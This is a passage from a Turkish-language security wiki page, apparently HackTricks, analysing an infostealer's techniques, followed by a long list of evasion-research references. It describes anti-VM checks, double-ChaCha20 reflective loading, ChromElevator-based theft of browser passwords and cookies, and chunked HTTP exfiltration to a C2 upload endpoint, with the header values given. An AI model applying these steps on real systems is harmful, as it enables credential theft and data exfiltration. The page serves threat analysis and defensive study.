- Variant B, sistem özelliklerini inceler (minimum süreç sayısı, yakın zamandaki çalışma süresi), VirtualBox additions’ı tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve tek adımlı yürütmeyi saptamak için sleep işlemlerinin öncesinde ve sonrasında zamanlama kontrolleri gerçekleştirir. Herhangi bir tespit, modüller başlatılmadan önce işlemi durdurur.

### Fileless helper + çift ChaCha20 reflective loading

- Birincil DLL/EXE, diske bırakılan veya belleğe manuel olarak map edilen bir Chromium kimlik bilgisi helper’ı içerir; fileless mode, hiçbir helper artifact’i yazılmaması için import ve relocation işlemlerini kendi çözer.
- Bu helper, ikinci aşama bir DLL’i ChaCha20 ile iki kez şifrelenmiş olarak saklar (iki adet 32-byte key + 12-byte nonce). Her iki şifre çözme işleminden sonra blob’u reflectively yükler (`LoadLibrary` kullanmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) kaynaklı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export’larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator rutinleri, canlı bir Chromium browser’a inject etmek, AppBound Encryption key’lerini devralmak ve ABE hardening’e rağmen SQLite database’lerinden parolaları/cookie’leri/kredi kartlarını doğrudan çözmek için direct-syscall reflective process hollowing kullanır.

### Modüler bellek içi toplama ve parçalı HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer tablosunu dolaşır ve etkin olan her modül için (Telegram, Discord, Steam, ekran görüntüleri, belgeler, browser extensions vb.) bir thread başlatır. Her thread sonuçları paylaşılan buffer’lara yazar ve yaklaşık 45 saniyelik join penceresinin ardından dosya sayısını bildirir.
- İşlem tamamlandığında her şey, statically linked `miniz` library kullanılarak `%TEMP%\\Log.zip` olarak sıkıştırılır. Ardından `ThreadPayload1` 15 saniye bekler ve arşivi, browser `multipart/form-data` boundary’sini (`----WebKitFormBoundary***`) taklit ederek HTTP POST ile 10 MB’lık parçalar halinde `http://<C2>:6767/upload` adresine gönderir. Her parçaya `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı olarak `w: <campaign_tag>` eklenir; son parçaya ise C2’nin yeniden birleştirmenin tamamlandığını anlaması için `complete: true` eklenir.

## References

- [1] [Gelişmiş Evasion Tradecraft: Hassas Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack’ler: malware için artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – örnek](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – örnek](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni infection chain ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Zero trust’ınıza güvenmeli misiniz? Zscaler posture kontrollerini atlatma](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell’den önce: Storm-2603’ün önceki ransomware operasyonlarını inceleme](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Export’ları kötüye kullanma](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Export envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Süreç güvenliği ve erişim hakları](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU başvurusu (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR’lara karşı koyma](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect tekniğiyle Windows Defender’ın koruyucu kabuğunu kırma](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink komut başvurusu](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain’ın arkasında: RAT’ten builder’a, builder’dan coder’a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Şehre Geliyor: Yeni ve iddialı bir Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing ile Node.js malware’ini etkisiz hâle getirme](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Crystal Palace ile Adaptix’i uyutmak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW’nizi gizleme](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team operasyonlarında Chrome Remote Desktop’ı kötüye kullanma: Uygulamalı bir rehber](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender’ın Remediation Driver’ını kernel operasyonları için bir primitive olarak weaponize etme](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo yardımcı kodu](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM kullanarak kendi kendini maskeleyen fonksiyonlar oluşturma](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole kaynak kodu](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe fonksiyonu](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Yönlendirilmiş girdi ve çıktıyla bir child process oluşturma](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: WasmForge ile C# araçlarını yeniden oluşturma](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET projelerini derleme](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept ve kaynak kodu](https://github.com/epersic/DLLParty)
- [47] [DLLParty — shellcodeless DLL injection için thread pool internals’ı kötüye kullanma](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark veri kümesi ve thrember araçları](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Red team implant’larını değerlendirmek için EMBER2024 kullanımı](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Machine Learning tabanlı tespitlerden kaçınma](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML tabanlı .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan metodu](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
